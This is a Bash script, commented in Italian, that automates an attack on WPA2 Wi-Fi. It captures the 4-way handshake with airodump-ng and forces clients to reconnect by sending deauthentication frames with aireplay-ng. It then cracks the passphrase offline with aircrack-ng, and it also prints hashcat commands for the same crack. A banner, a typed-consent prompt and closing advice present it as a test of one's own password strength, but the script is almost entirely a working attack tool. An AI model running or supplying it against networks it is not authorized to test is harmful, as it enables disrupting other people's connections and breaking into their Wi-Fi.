#!/usr/bin/env bash
#
# capture_handshake.sh — Cattura l'handshake WPA2 della TUA rete e ne testa la
#                        robustezza della password con una wordlist (crack offline).
#
#  ╔══════════════════════════════════════════════════════════════════════╗
#  ║  USO AUTORIZZATO SOLTANTO. Solo sulla TUA rete o con autorizzazione.  ║
#  ║  Crackare reti altrui e' illegale. Scopo: misurare quanto e' forte la ║
#  ║  TUA password e capire perche' serve una passphrase lunga (o WPA3).   ║
#  ╚══════════════════════════════════════════════════════════════════════╝
#
# Come funziona: alla connessione, client e AP scambiano un 4-way handshake.
# Catturandolo si puo' tentare offline di indovinare la password provando le
# voci di una wordlist. Con password forti (lunghe/casuali) il crack fallisce:
# ecco la lezione difensiva. WPA3-SAE rende inefficace questo attacco.
#
# Uso:
#   sudo ./capture_handshake.sh -i wlan0mon -b <BSSID> -h <CANALE> [-c <CLIENT>] [-w wordlist.txt]
#
set -euo pipefail

IFACE="" BSSID="" CH="" CLIENT="" WORDLIST="" DURATION=60
OUT="handshake_$(date +%Y%m%d_%H%M%S 2>/dev/null || echo cap)"

usage() { grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 1; }

while getopts "i:b:h:c:w:d:" opt; do
  case $opt in
    i) IFACE=$OPTARG ;;
    b) BSSID=$OPTARG ;;
    h) CH=$OPTARG ;;
    c) CLIENT=$OPTARG ;;
    w) WORDLIST=$OPTARG ;;
    d) DURATION=$OPTARG ;;
    *) usage ;;
  esac
done

[[ -z "$IFACE" || -z "$BSSID" || -z "$CH" ]] && usage
[[ "$EUID" -ne 0 ]] && { echo "Servono privilegi di root (sudo)." >&2; exit 1; }

echo "╔══════════════════════════════════════════════════════════╗"
echo "║  Confermi di POSSEDERE/essere AUTORIZZATO su questa rete? ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo "  AP=$BSSID  canale=$CH  client=${CLIENT:-<tutti>}"
read -rp "Scrivi 'si' per procedere: " ANS
[[ "${ANS,,}" =~ ^(si|sì|yes)$ ]] || { echo "Annullato."; exit 1; }

echo "[*] Imposto il canale $CH su $IFACE"
iw dev "$IFACE" set channel "$CH" 2>/dev/null || true

echo "[*] Avvio airodump-ng (cattura su $OUT-01.cap) per ${DURATION}s ..."
airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT" "$IFACE" >/dev/null 2>&1 &
AIRO_PID=$!
trap 'kill $AIRO_PID 2>/dev/null || true' EXIT

sleep 3
# Deauth mirato per forzare la riconnessione di un client (solo sulla TUA rete):
if [[ -n "$CLIENT" ]]; then
  echo "[*] Invio 5 deauth a $CLIENT per accelerare l'handshake ..."
  aireplay-ng --deauth 5 -a "$BSSID" -c "$CLIENT" "$IFACE" >/dev/null 2>&1 || true
else
  echo "[*] Nessun client indicato: attendo una riconnessione spontanea."
  echo "    (Riconnetti un tuo dispositivo al WiFi per generare l'handshake.)"
fi

echo "[*] Cattura in corso... ($DURATION s). Premi Ctrl+C per fermare prima."
sleep "$DURATION" || true

kill $AIRO_PID 2>/dev/null || true
trap - EXIT
sync

CAP="${OUT}-01.cap"
echo
echo "[*] Verifico la presenza dell'handshake in $CAP ..."
if ! aircrack-ng "$CAP" 2>/dev/null | grep -qiE "1 handshake|WPA \(.*handshake"; then
  echo "[!] Handshake NON trovato. Riprova facendo riconnettere un dispositivo,"
  echo "    oppure aumenta la durata con -d, o passa il MAC del client con -c."
  exit 0
fi
echo "[+] Handshake catturato in $CAP"

if [[ -z "$WORDLIST" ]]; then
  echo
  echo "[i] Nessuna wordlist fornita (-w). Per testare la password lancia:"
  echo "      aircrack-ng -w /percorso/wordlist.txt -b $BSSID $CAP"
  echo "    Oppure con hashcat (piu' veloce su GPU):"
  echo "      hcxpcapngtool -o hash.hc22000 $CAP && hashcat -m 22000 hash.hc22000 wordlist.txt"
  exit 0
fi

echo "[*] Avvio crack offline con wordlist: $WORDLIST"
aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP" || true
echo
echo "[i] Lezione difensiva:"
echo "    - Password TROVATA  => era troppo debole/comune: usane una lunga e casuale."
echo "    - Password NON trovata => buona robustezza contro attacchi a dizionario."
echo "    - Passa a WPA3-SAE per neutralizzare del tutto il crack offline."
